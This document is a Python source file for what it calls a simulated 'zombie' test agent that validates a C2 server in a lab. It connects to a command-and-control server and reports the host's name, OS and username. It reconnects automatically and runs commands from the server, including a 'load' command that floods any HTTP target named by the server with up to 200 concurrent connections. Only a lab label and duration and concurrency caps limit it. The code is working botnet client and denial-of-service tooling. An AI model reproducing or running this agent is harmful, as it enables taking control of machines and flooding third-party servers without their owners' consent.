"""Agente de prueba (zombie simulado) para validar el servidor C2 en laboratorio."""
from __future__ import annotations

import argparse
import asyncio
import contextlib
import getpass
import json
import os
import platform
import socket
import sys
import time
import urllib.parse

HEARTBEAT_SECONDS = 10.0
CONNECT_TIMEOUT = 5.0
MAX_DURATION_S = 120
MAX_CONCURRENCY = 200


def encode(message: dict) -> bytes:
    return (json.dumps(message, ensure_ascii=False, separators=(",", ":")) + "\n").encode("utf-8")


def _as_int(value, default: int) -> int:
    try:
        return int(value)
    except (TypeError, ValueError):
        return default


def should_reconnect(exit_code: int, interval: float) -> bool:
    return interval > 0 and exit_code != 0


def build_hello(agent_id: str, secret: str = "") -> dict:
    return {
        "type": "hello",
        "agent_id": agent_id,
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": getpass.getuser(),
        "version": "0.2",
        "secret": secret,
    }


def handle_command(message: dict) -> dict:
    name = message.get("name")
    args = message.get("args") or {}
    command_id = message.get("id")
    if name == "ping":
        return {"type": "result", "id": command_id, "status": "ok", "data": {"pong": True}}
    if name == "info":
        return {
            "type": "result",
            "id": command_id,
            "status": "ok",
            "data": {
                "hostname": socket.gethostname(),
                "os": f"{platform.system()} {platform.release()} ({platform.machine()})",
                "user": getpass.getuser(),
                "python": platform.python_version(),
                "cpus": os.cpu_count(),
            },
        }
    if name == "echo":
        return {"type": "result", "id": command_id, "status": "ok", "data": {"text": args.get("text", "")}}
    return {
        "type": "result",
        "id": command_id,
        "status": "error",
        "data": {"error": f"comando no soportado: {name}"},
    }


def _build_request(host: str, path: str) -> bytes:
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "User-Agent: carga-laboratorio-UTN/0.2\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).encode("ascii", errors="ignore")


async def _load_worker(host: str, port: int, request: bytes, deadline: float, stats: dict) -> None:
    while time.monotonic() < deadline:
        writer = None
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=CONNECT_TIMEOUT
            )
            writer.write(request)
            await writer.drain()
            await asyncio.wait_for(reader.read(4096), timeout=CONNECT_TIMEOUT)
            stats["sent"] += 1
        except (OSError, asyncio.TimeoutError):
            stats["errors"] += 1
        finally:
            if writer is not None:
                with contextlib.suppress(Exception):
                    writer.close()


def parse_target(target: str) -> tuple[str, int, str]:
    parsed = urllib.parse.urlsplit(target)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("objetivo invalido: use http://host[:puerto][/ruta]")
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path = f"{path}?{parsed.query}"
    return host, port, path


async def run_load(target: str, duration: int, concurrency: int) -> dict:
    host, port, path = parse_target(target)
    duration = max(1, min(int(duration), MAX_DURATION_S))
    concurrency = max(1, min(int(concurrency), MAX_CONCURRENCY))
    request = _build_request(host, path)
    deadline = time.monotonic() + duration
    stats = {"sent": 0, "errors": 0}
    workers = [
        asyncio.create_task(_load_worker(host, port, request, deadline, stats))
        for _ in range(concurrency)
    ]
    await asyncio.gather(*workers)
    return {
        "sent": stats["sent"],
        "errors": stats["errors"],
        "duration_s": duration,
        "rps": round(stats["sent"] / duration, 1),
    }


async def _handle_load(message: dict) -> dict:
    args = message.get("args") or {}
    command_id = message.get("id")
    target = str(args.get("target", ""))
    duration = _as_int(args.get("duration"), 30)
    concurrency = _as_int(args.get("concurrency"), 20)
    print(f"[test-agent] inundacion: {target} durante {duration}s con {concurrency} conexiones")
    try:
        data = await run_load(target, duration, concurrency)
    except Exception as exc:
        return {"type": "result", "id": command_id, "status": "error", "data": {"error": str(exc)}}
    print(f"[test-agent] carga finalizada: enviadas={data['sent']} errores={data['errors']} rps={data['rps']}")
    return {"type": "result", "id": command_id, "status": "ok", "data": data}


async def run(host: str, port: int, agent_id: str, secret: str) -> int:
    try:
        reader, writer = await asyncio.open_connection(host, port)
    except OSError as exc:
        print(f"[test-agent] no se pudo conectar a {host}:{port}: {exc}")
        return 1
    writer.write(encode(build_hello(agent_id, secret)))
    await writer.drain()
    print(f"[test-agent] conectado como {agent_id} en {host}:{port}")
    try:
        while True:
            try:
                line = await asyncio.wait_for(reader.readline(), timeout=HEARTBEAT_SECONDS)
            except asyncio.TimeoutError:
                writer.write(encode({"type": "heartbeat", "ts": time.time()}))
                await writer.drain()
                continue
            if not line:
                print("[test-agent] el servidor cerro la conexion")
                return 2
            message = json.loads(line.decode("utf-8"))
            if message.get("type") != "command":
                continue
            name = message.get("name")
            print(f"[test-agent] comando recibido: {name}")
            if name == "stop":
                writer.write(
                    encode({"type": "result", "id": message.get("id"), "status": "ok", "data": {"stopping": True}})
                )
                await writer.drain()
                print("[test-agent] detenido por el servidor")
                return 0
            if name == "load":
                reply = await _handle_load(message)
            else:
                reply = handle_command(message)
            writer.write(encode(reply))
            await writer.drain()
    finally:
        writer.close()


def main() -> int:
    parser = argparse.ArgumentParser(description="Agente de prueba para el servidor C2 (solo laboratorio)")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=8443)
    parser.add_argument("--id", dest="agent_id", default=f"zombie-{socket.gethostname().lower()[:12]}")
    parser.add_argument("--secret", default=os.environ.get("C2_SHARED_SECRET", ""))
    parser.add_argument(
        "--reconnect",
        type=float,
        default=0.0,
        metavar="SEGUNDOS",
        help="reintentar la conexion cada N segundos si el C2 no esta disponible (0 = salir)",
    )
    args = parser.parse_args()
    while True:
        try:
            code = asyncio.run(run(args.host, args.port, args.agent_id, args.secret))
        except KeyboardInterrupt:
            return 0
        if not should_reconnect(code, args.reconnect):
            return code
        print(f"[test-agent] reconectando en {args.reconnect:.0f}s (Ctrl+C para salir)")
        time.sleep(args.reconnect)


if __name__ == "__main__":
    sys.exit(main())
